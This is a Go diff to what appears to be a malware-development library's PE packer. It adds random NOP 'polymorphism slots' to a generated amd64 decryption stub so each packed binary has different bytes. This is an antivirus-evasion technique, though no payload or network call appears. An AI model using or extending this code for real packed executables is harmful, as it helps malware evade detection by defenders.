@@ -2,6 +2,7 @@ package packer
 
 import (
 	"fmt"
+	mathrand "math/rand"
 
 	"github.com/oioio-space/maldev/pe/packer/stubgen/amd64"
 )
@@ -41,6 +42,16 @@ import (
 // .no_match); the Windows variant inherits via the existing
 // bundleStubVendorAwareWindows patcher.
 func bundleStubVendorAwareV2Negate() ([]byte, int, error) {
+	return bundleStubVendorAwareV2NegateRng(nil)
+}
+
+// bundleStubVendorAwareV2NegateRng is the rng-driven core. When rng
+// is non-nil, polymorphism slots B (between CPUID prologue and the
+// scan loop header) and C (between matched-pointer-computation and
+// the decrypt step) get a fresh random NOP run per call. rng=nil
+// produces deterministic bytes — used by tests + by the no-junk
+// public wrapper.
+func bundleStubVendorAwareV2NegateRng(rng *mathrand.Rand) ([]byte, int, error) {
 	b, err := amd64.New()
 	if err != nil {
 		return nil, 0, fmt.Errorf("packer: amd64 builder: %w", err)
@@ -120,6 +131,12 @@ func bundleStubVendorAwareV2Negate() ([]byte, int, error) {
 	}
 	if e := check(b.XOR(amd64.RAX, amd64.RAX), "xor eax 2"); e != nil {
 		return nil, 0, e
+	}
+
+	// Polymorphism slot B — between CPUID prologue and scan loop
+	// header. Inert NOP run; Builder auto-resolves Jcc targets.
+	if err := emitNopJunk(b, rng); err != nil {
+		return nil, 0, err
 	}
 
 	// === Section 4: Loop body with AL-accumulator + negate ===
@@ -342,6 +359,13 @@ func bundleStubVendorAwareV2Negate() ([]byte, int, error) {
 	}
 	if e := check(b.MOV(amd64.RCX, amd64.R9), "matched mov rcx"); e != nil {
 		return nil, 0, e
+	}
+
+	// Polymorphism slot C — between matched-pointer-computation and
+	// the decrypt-step header. JE(.jmp_payload) and JMP(.dec) target
+	// labels that come after this slot; Builder auto-resolves both.
+	if err := emitNopJunk(b, rng); err != nil {
+		return nil, 0, err
 	}
 
 	if e := check(b.MOVL(amd64.RDI, amd64.MemOp{Base: amd64.RCX}), "dec mov edi"); e != nil {
